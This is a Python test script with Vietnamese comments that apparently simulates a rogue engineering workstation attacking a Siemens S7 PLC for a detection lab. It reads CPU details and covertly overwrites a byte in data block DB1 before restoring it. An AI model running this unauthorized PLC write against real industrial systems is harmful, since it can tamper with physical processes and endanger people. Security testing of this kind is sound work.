#!/usr/bin/env python3
"""
tests/test_ews_rogue.py
Kết nối S7 từ IP attacker, đọc CPU info + covert write DB1.

Chạy: python tests/test_ews_rogue.py
"""

import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *


def main():
    print(f"\n{B}[TEST] EWS_ROGUE_ENGINEER{X}")
    info(f"Target PLC: {PLC_IP}  rack={RACK} slot={SLOT}")

    changes = []
    observable = []
    notes = []
    error = None
    success = False
    t0 = time.time()

    try:
        import snap7

        c = snap7.client.Client()
        c.connect(PLC_IP, RACK, SLOT)
        ok(f"Ket noi S7 thanh cong tu IP attacker")

        cpu_info = c.get_cpu_info()
        module = cpu_info.ModuleTypeName.decode().strip()
        serial = cpu_info.SerialNumber.decode().strip()
        state = c.get_cpu_state()
        ok(f"CPU: {module}  Serial: {serial}  State: {state}")
        observable.append(f"S7 GetCPUInfo tu IP attacker")
        observable.append(f"S7 GetCPUState: {state}")

        before = plc_snapshot(c)
        info(f"DB1 truoc: {before['db1'][:32]}...")

        try:
            db1 = bytearray(c.db_read(1, 0, 10))
            orig = db1[2]
            db1[2] = (orig + 3) % 256
            c.db_write(1, 0, bytes(db1))
            ok(f"Covert write DB1[2]: {orig} -> {db1[2]}")
            observable.append(f"S7 Write DB1 tu IP attacker (khong phai EWS hop le)")
            time.sleep(1)

            after = plc_snapshot(c)
            changes = plc_diff(before, after)
            info(f"DB1 sau:   {after['db1'][:32]}...")

            db1[2] = orig
            c.db_write(1, 0, bytes(db1))
            verify = c.db_read(1, 0, 10)
            ok(f"Khoi phuc DB1[2] -> {verify[2]}")

        except Exception:
            warn("DB1 khong doc/ghi duoc — nhung session S7 da tao traffic")
            observable.append("S7 session tu IP la da ton tai trong pcap")

        notes.append(f"Module: {module} | Serial: {serial}")
        notes.append("Dau vet: S7 session tu IP la trong pcap port 102")
        success = True
        c.disconnect()

    except ImportError:
        error = "python-snap7 chua cai: pip install python-snap7"
        fail(error)
    except Exception as e:
        error = str(e)
        fail(str(e))

    print_result("EWS_ROGUE_ENGINEER", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
